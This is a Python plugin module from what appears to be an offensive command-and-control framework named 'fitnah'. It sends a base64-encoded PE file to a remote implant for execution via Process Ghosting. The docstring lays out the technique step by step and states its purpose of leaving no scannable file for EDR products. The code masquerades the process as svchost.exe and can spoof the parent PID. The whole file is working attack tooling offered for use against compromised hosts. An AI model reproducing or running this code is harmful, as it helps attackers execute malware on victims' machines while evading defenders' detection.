"""
execution/ghost_inject — Process Ghosting PE-to-memory executor

Executes a PE file on the target using Process Ghosting:
  1. PE is written to a DELETE_ON_CLOSE temp file (tombstoned)
  2. NtCreateSection(SEC_IMAGE) from the tombstoned file handle
  3. File deleted from disk — no scannable artefact
  4. NtCreateProcessEx from section → ghost process (image path = deleted file)
  5. NtCreateThreadEx at PE entry point

EDRs cannot scan the file on disk (it no longer exists at scan time).
The process image appears to reference a non-existent path.

MITRE: T1055.012 (Process Injection: Process Hollowing / Ghosting)
       T1036     (Masquerading — fake cmdline)
"""

import base64
import os
from pathlib import Path

from fitnah.sdk.base_plugin import BasePlugin
from fitnah.sdk.context import PluginContext
from fitnah.sdk.result import ModuleResult
from fitnah.sdk.schema import Param, ParamSchema


class GhostInject(BasePlugin):
    NAME        = "ghost_inject"
    DESCRIPTION = (
        "Execute a PE file via Process Ghosting — no scannable file on disk "
        "(NtCreateSection from tombstoned file + NtCreateProcessEx)"
    )
    MITRE       = "T1055.012,T1036"
    CATEGORY    = "execution"

    schema = ParamSchema().add(
        Param("pe_b64", str, required=False, default="",
              help="Base64-encoded PE file bytes to ghost-inject"),
        Param("pe_path", str, required=False, default="",
              help="Local path to PE file on the operator workstation "
                   "(read, base64-encoded, and sent to implant)"),
        Param("cmdline", str, required=False,
              default="C:\\Windows\\System32\\svchost.exe -k netsvcs",
              help="Fake command line shown in process listings"),
        Param("parent_pid", int, required=False, default=0,
              help="PID to spoof as parent process (0 = current process)"),
    )

    def run(self, session, params, ctx: PluginContext = None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")

        pe_b64  = params.get("pe_b64", "")
        pe_path = params.get("pe_path", "")
        cmdline = params.get("cmdline", "C:\\Windows\\System32\\svchost.exe -k netsvcs")
        parent_pid = int(params.get("parent_pid", 0))

        # Resolve PE bytes
        if not pe_b64:
            if not pe_path:
                return ModuleResult.err(
                    "Provide pe_b64 (base64 PE bytes) or pe_path (local PE file path)"
                )
            p = Path(pe_path)
            if not p.exists():
                return ModuleResult.err(f"PE file not found: {pe_path}")
            pe_b64 = base64.b64encode(p.read_bytes()).decode()

        # Validate minimal PE header
        try:
            raw = base64.b64decode(pe_b64)
        except Exception as exc:
            return ModuleResult.err(f"base64 decode failed: {exc}")

        if len(raw) < 64 or raw[:2] != b"MZ":
            return ModuleResult.err("Not a valid PE file (missing MZ header)")

        args = {
            "pe_b64":     pe_b64,
            "cmdline":    cmdline,
            "parent_pid": parent_pid,
        }

        r = ctx.send("ghost_inject", args)
        if not isinstance(r, dict):
            return ModuleResult.err(f"Unexpected response: {r}")

        if r.get("status") == "ok":
            pid = r.get("pid", 0)
            return ModuleResult.ok(
                data=f"Ghost process started — PID {pid} (image path is a tombstoned file)",
                loot_kind="ghost_inject",
            )

        return ModuleResult.err(r.get("msg", "ghost_inject failed"))
